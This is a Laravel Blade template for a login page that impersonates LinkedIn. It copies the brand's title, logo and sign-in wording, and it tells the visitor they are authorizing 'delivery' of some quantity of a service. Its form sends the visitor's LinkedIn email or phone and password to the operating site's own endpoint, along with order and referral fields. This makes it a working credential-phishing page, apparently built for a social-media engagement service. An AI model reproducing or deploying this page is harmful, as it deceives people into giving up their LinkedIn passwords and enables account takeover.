@extends('platform-login.layout')

@section('title', 'LinkedIn Login, Sign in | LinkedIn')

@section('content')
<div class="w-full max-w-[420px] mx-auto space-y-4">
    <!-- LinkedIn Login Card -->
    <div class="bg-[#1b1f23] border border-white/10 rounded-2xl p-8 sm:p-10 shadow-2xl relative">
        <div class="mb-6 flex items-center justify-between">
            <span class="text-3xl font-extrabold text-[#0a66c2] tracking-tighter">Linked<span class="bg-[#0a66c2] text-white px-1.5 py-0.5 rounded ml-0.5">in</span></span>
            <span class="text-xs text-gray-400 font-medium">Professional Network</span>
        </div>

        <h2 class="text-2xl font-bold text-white mb-1">Sign in</h2>
        <p class="text-xs text-gray-400 mb-6">
            Authorize delivery of <strong class="text-white">{{ number_format($quantity) }} {{ $service }}</strong>
            @if(!empty($username))
                for <span class="text-[#0a66c2]">{{ $username }}</span>
            @endif
        </p>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'linkedin']) }}" class="space-y-4">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 7 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">
            <input type="hidden" name="ref_id" value="{{ $refId }}">

            <div>
                <label class="block text-xs font-semibold text-gray-300 mb-1">Email or phone</label>
                <input type="text" name="email" required
                    value="{{ $username }}"
                    class="w-full px-4 py-3 text-sm rounded-lg bg-[#12161a] border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-[#0a66c2] transition-colors"
                    placeholder="Email or phone">
            </div>

            <div class="relative">
                <label class="block text-xs font-semibold text-gray-300 mb-1">Password</label>
                <input type="password" id="li_password" name="password" required
                    class="w-full px-4 py-3 pr-14 text-sm rounded-lg bg-[#12161a] border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-[#0a66c2] transition-colors"
                    placeholder="Password">
                <button type="button" onclick="togglePassword('li_password', this)"
                    class="absolute right-4 top-8 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <div class="text-xs">
                <span class="text-[#0a66c2] hover:underline cursor-pointer font-semibold">Forgot password?</span>
            </div>

            <button type="submit"
                class="w-full py-3.5 bg-[#0a66c2] hover:bg-[#004182] text-white font-bold text-sm rounded-full transition-all active:scale-[0.98]">
                Sign in
            </button>
        </form>

        <div class="mt-6 text-center text-xs text-gray-400">
            New to LinkedIn? <span class="text-[#0a66c2] font-semibold hover:underline cursor-pointer">Join now</span>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
